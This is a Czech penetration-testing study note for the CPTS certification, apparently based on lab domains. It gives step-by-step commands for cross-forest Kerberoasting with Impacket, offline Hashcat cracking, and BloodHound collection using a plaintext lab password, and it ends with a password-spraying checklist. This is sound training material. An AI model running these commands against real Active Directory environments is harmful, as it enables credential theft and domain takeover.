# 📖 CPTS: Útoky na doménové vztahy (Trusts) – Cross-Forest Trust Abuse (Linux)

Při provedení pentestu Active Directory z attack hostu s operačním systémem Linux (např. Kali Linux) máme k dispozici nástroje z sady **Impacket** a **BloodHound-python**. Pomocí nich lze provádět napříč doménovými lesy (Cross-Forest) stejné útoky jako z Windows, zejména **Cross-Forest Kerberoasting** a **detekci Foreign Group Memberships**.

## 🔍 Teoretický přehled technik (Linux)

### 1. Cross-Forest Kerberoasting (Impacket)

- **Princip:** V prostředí s příchozí nebo obousměrnou důvěrou lze použít platné účty z domény A k vyžádání TGS ticketu pro servisní účet (SPN) v cílové doméně B.
    
- **Nástroj:** `GetUserSPNs.py` ze sady Impacket s parametrem `-target-domain`.
    
- **Cíl:** Získat TGS hash účtu v cílové doméně (např. účet s právy `Domain Admins`) a offline ho prolomit v Hashcatu (mód `13100`).
    

### 2. BloodHound-python & Foreign Group Membership

- **Princip:** Ve Windows AD mohou pouze skupiny typu **Domain Local** obsahovat členy z cizího lesa. Pokud je uživatel z domény A členem lokální skupiny `Administrators` v doméně B, ovládnutí uživatele v doméně A automaticky dává administrativní přístup k doméně B.
    
- **Nástroj:** `bloodhound-python` spuštěný postupně pro obě domény. Pro správné fungování je často nutné explicitně nastavit DNS resolver v `/etc/resolv.conf`.
    

## 🛠️ Postup útoku krok za krokem

### Krok 1: Cross-Forest Kerberoasting pomocí Impacket

1. **Enumerace SPN účtů v cílové doméně:**
    
    ```
    GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
    ```
    
2. **Vyžádání TGS ticketu (Kerberoast):**
    
    ```
    GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile tgs_hashes.txt
    ```
    
3. **Crackování TGS ticketu (offline v Hashcatu):**
    
    ```
    hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
    ```
    

### Krok 2: Detekce Foreign Group Memberships (BloodHound)

1. **Úprava DNS v `/etc/resolv.conf` (pokud chybí DNS rozlišení):**
    
    ```
    sudo nano /etc/resolv.conf
    ```
    
    _Přidat doménu a IP cílového DC:_
    
    ```
    domain INLANEFREIGHT.LOCAL
    nameserver 172.16.5.5
    ```
    
2. **Sbírání dat pro výchozí doménu (INLANEFREIGHT.LOCAL):**
    
    ```
    bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -c All -u forend -p Klmcargo2
    ```
    
3. **Úprava `/etc/resolv.conf` pro cílovou doménu:**
    
    ```
    domain FREIGHTLOGISTICS.LOCAL
    nameserver 172.16.5.238
    ```
    
4. **Sbírání dat pro cílovou doménu (FREIGHTLOGISTICS.LOCAL):**
    
    ```
    bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
    ```
    
5. **Sbalení a import JSON souborů do BloodHound GUI:**
    
    ```
    zip -r ilfreight_bh.zip *.json
    ```
    
    - _V BloodHound GUI:_ Na záložce **Analysis** zvolit **Users with Foreign Domain Group Membership** a vybrat zdrojovou doménu.
        

# 📋 CPTS Checklist: Cross-Forest Trust Abuse (Linux)

### 🔲 Fáze 1: Cross-Forest Kerberoasting (Impacket)

- [ ] **Spustit GetUserSPNs.py:** Vyhledat SPN v cílové doméně s parametrem `-target-domain <Target_Domain>`.
    
- [ ] **Vyžádat TGS hashes:** Použít flag `-request` a uložit výstup pomocí `-outputfile`.
    
- [ ] **Offline crackování:** Spustit Hashcat (`-m 13100`) na získané TGS tikety.
    
- [ ] **Test Password Reuse:** Vyzkoušet prolomené heslo na stejně pojmenovaných účtech nebo pro password spray napříč druhou doménou.
    

### 🔲 Fáze 2: BloodHound Enumerace (Linux Host)

- [ ] **Nastavit /etc/resolv.conf:** Namapovat `nameserver` na IP řadiče domény A.
    
- [ ] **Spustit bloodhound-python (Doména A):** Vygenerovat JSON soubory pro první doménu.
    
- [ ] **Přenastavit /etc/resolv.conf:** Namapovat `nameserver` na IP řadiče domény B.
    
- [ ] **Spustit bloodhound-python (Doména B):** Vygenerovat JSON soubory pro druhou doménu z cizího lesa.
    
- [ ] **Import & Analýza:** Nahrát `.zip` soubor do BloodHound GUI a zkontrolovat dotaz _Users with Foreign Domain Group Membership_.